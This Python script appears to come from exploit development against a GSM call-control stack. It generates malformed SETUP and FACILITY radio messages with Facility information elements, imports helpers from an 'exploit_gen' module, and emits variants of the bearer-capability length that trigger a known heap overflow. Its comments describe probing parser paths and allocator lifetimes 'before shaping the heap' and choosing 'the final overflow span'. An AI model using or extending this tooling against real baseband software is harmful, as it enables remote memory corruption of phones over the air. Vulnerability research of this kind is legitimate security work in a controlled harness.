#!/usr/bin/env python3
"""Make bounded stock-gsm_cc SETUP variants with a Facility IE.

The returned bytes are exact stock-harness work items.  The default cases
keep the known bearer-copy length, while the ``nobc`` cases are parser-only
controls that do not exercise the overflow.
"""

from pathlib import Path
import sys

from exploit_gen import setup_pdu


def make(name, iei, facility, bc_len=0x87):
    pdu = bytearray(setup_pdu(bc_len))
    pdu.extend((iei, len(facility)))
    pdu.extend(facility)
    Path(name).write_bytes(pdu)
    print(f"{name}: {len(pdu)} bytes, IEI=0x{iei:02x}, facility={facility.hex()}")


def make_facility_msg(name, facility, msg_type=0x3a):
    """Build a raw GSM CC FACILITY message for the stock CC mailbox path.

    The first sixteen bytes are the same opaque radio-frame prefix used by
    the minimized SETUP.  The CC L3 decoder then sees PD/TI, FACILITY, and the
    0x1c Facility IE at offset 0x10.
    """
    pdu = bytearray([0x30] * 0x10)
    pdu.extend((0x03, msg_type, 0x1c, len(facility)))
    pdu.extend(facility)
    Path(name).write_bytes(pdu)
    print(f"{name}: {len(pdu)} bytes, msg=0x{msg_type:02x}, facility={facility.hex()}")


def main(outdir):
    out = Path(outdir)
    out.mkdir(parents=True, exist_ok=True)
    variants = [
        ("fac_1c_empty.bin", 0x1c, b""),
        ("fac_1c_invoke.bin", 0x1c, bytes.fromhex("a1 03 02 01 01")),
        ("fac_1c_ss.bin", 0x1c, bytes.fromhex("a1 06 02 01 01 02 01 3b")),
        ("fac_7c_invoke.bin", 0x7c, bytes.fromhex("a1 03 02 01 01")),
        ("fac_7c_ss.bin", 0x7c, bytes.fromhex("a1 06 02 01 01 02 01 3b")),
    ]

    # Operation families returned by the generated open-type mapper, plus
    # the values advertised by the Facility validator.
    ops = (0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
           0x12, 0x13, 0x20, 0x21, 0x28, 0x29, 0x2a, 0x2b,
           0x3b, 0x3c, 0x3d, 0x41, 0x73, 0x74, 0x78, 0x7d)
    for op in ops:
        value = bytes((0xa1, 0x06, 0x02, 0x01, 0x01, 0x02, 0x01, op))
        variants.append((f"fac_1c_op{op:02x}.bin", 0x1c, value))
        variants.append((f"fac_7c_op{op:02x}.bin", 0x7c, value))

    # Argument container/tag probes for the accepted operation 0x20.
    for suffix, argument in (
        ("seq0", bytes.fromhex("30 00")),
        ("seq10", bytes.fromhex("30 01 10")),
        ("seq0400", bytes.fromhex("30 02 04 00")),
        ("a000", bytes.fromhex("a0 00")),
        ("a010", bytes.fromhex("a0 01 10")),
        ("ctx8010", bytes.fromhex("80 01 10")),
        ("ctx8110", bytes.fromhex("81 01 10")),
        ("ctx8210", bytes.fromhex("82 01 10")),
        ("octet10", bytes.fromhex("04 01 10")),
        ("int10", bytes.fromhex("02 01 10")),
        ("intnested10", bytes.fromhex("02 02 02 01 10")),
        ("null", bytes.fromhex("06 00")),
        ("null10", bytes.fromhex("06 01 10")),
    ):
        content = bytes.fromhex("02 01 01 02 01 20") + argument
        value = bytes((0xa1, len(content))) + content
        variants.append((f"fac_1c_op20_{suffix}.bin", 0x1c, value))

    # The operation mapper is a separate generated switch.  Exercise the
    # same INTEGER-shaped argument on every candidate operation.
    for op in ops:
        content = bytes((0x02, 0x01, 0x01, 0x02, 0x01, op,
                         0x02, 0x01, 0x10))
        value = bytes((0xa1, len(content))) + content
        variants.append((f"fac_1c_op{op:02x}_int10.bin", 0x1c, value))

    # NotifySS (0x10) uses the 0xac open type, whose first field is a
    # sequence with context-specific members.  Keep these deliberately
    # small to identify the SS-code field before shaping the heap.
    for suffix, argument in (
        ("seq0", bytes.fromhex("30 00")),
        ("seq80_10", bytes.fromhex("30 03 80 01 10")),
        ("seq81_10", bytes.fromhex("30 03 81 01 10")),
        ("seq82_10", bytes.fromhex("30 03 82 01 10")),
        ("seq83_10", bytes.fromhex("30 03 83 01 10")),
        ("seq84_10", bytes.fromhex("30 03 84 01 10")),
        ("seq85_10", bytes.fromhex("30 03 85 01 10")),
        ("seq80_int", bytes.fromhex("30 05 80 03 02 01 10")),
        ("seq81_int", bytes.fromhex("30 05 81 03 02 01 10")),
        ("seq80_seq", bytes.fromhex("30 05 80 03 30 01 10")),
    ):
        content = bytes.fromhex("02 01 01 02 01 10") + argument
        value = bytes((0xa1, len(content))) + content
        variants.append((f"fac_1c_op10_{suffix}.bin", 0x1c, value))

    # NotifySS's first sequence member is the SS-code IE (context tag 0x81).
    # Generate one parser-only and one normal-length case per commonly used
    # GSM supplementary-service code.  These are intentionally tiny: they
    # let us identify the service transaction and its allocator lifetime
    # before restoring the bearer-copy overflow.
    ss_codes = (0x0b, 0x10, 0x11, 0x12, 0x13,
                0x21, 0x28, 0x29, 0x2a, 0x2b,
                0x30, 0x31, 0x32, 0x33, 0x41)
    for code in ss_codes:
        argument = bytes((0x30, 0x03, 0x81, 0x01, code))
        content = bytes.fromhex("02 01 01 02 01 10") + argument
        value = bytes((0xa1, len(content))) + content
        variants.append((f"fac_1c_op10_ss{code:02x}.bin", 0x1c, value))

    for filename, iei, value in variants:
        make(str(out / filename), iei, value)

    # The entries above are parser-only by default because they are added to
    # `variants` before emission.  Re-emit the NotifySS SS-code controls with
    # the known-safe bearer length so their names are unambiguous and they do
    # not accidentally exercise the heap overflow during triage.
    for code in ss_codes:
        argument = bytes((0x30, 0x03, 0x81, 0x01, code))
        content = bytes.fromhex("02 01 01 02 01 10") + argument
        value = bytes((0xa1, len(content))) + content
        make(str(out / f"fac_1c_nobc_op10_ss{code:02x}.bin"), 0x1c,
             value, bc_len=0x20)

    # A CC FACILITY message is dispatched through the SS decoder rather than
    # the SETUP-side NotifySS helper.  Keep the same accepted operation and
    # SS-code probes so the two legal signaling paths can be compared.
    for code in ss_codes:
        argument = bytes((0x30, 0x03, 0x81, 0x01, code))
        content = bytes.fromhex("02 01 01 02 01 10") + argument
        value = bytes((0xa1, len(content))) + content
        make_facility_msg(str(out / f"radio_facility_op10_ss{code:02x}.bin"), value)

    # Length-fidelity controls for the vulnerable bearer copy.  The BC
    # decoder re-encodes some very large values, so retain these boundaries
    # as small stock SETUP probes before selecting the final overflow span.
    facility = bytes.fromhex("a1 0b 02 01 01 02 01 10 30 03 81 01 21")
    for bc_len in (0x87, 0x90, 0xa0, 0xb0, 0xc0, 0xd0, 0xd8,
                   0xdc, 0xe0, 0xe8, 0xf0, 0xf8, 0xfe):
        pdu = bytearray(setup_pdu(bc_len))
        pdu.extend((0x1c, len(facility)))
        pdu.extend(facility)
        Path(out / f"stock_len_{bc_len:02x}.bin").write_bytes(pdu)

    # Controls without the bearer overflow; these distinguish parser and
    # transaction lifetime from the later heap corruption.
    for op in (0x0a, 0x10, 0x12, 0x20, 0x29, 0x3b, 0x78, 0x7d):
        content = bytes((0x02, 0x01, 0x01, 0x02, 0x01, op,
                         0x02, 0x01, 0x10))
        value = bytes((0xa1, len(content))) + content
        make(str(out / f"fac_1c_nobc_op{op:02x}_int10.bin"), 0x1c,
             value, bc_len=0x20)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "exp/fac_variants")
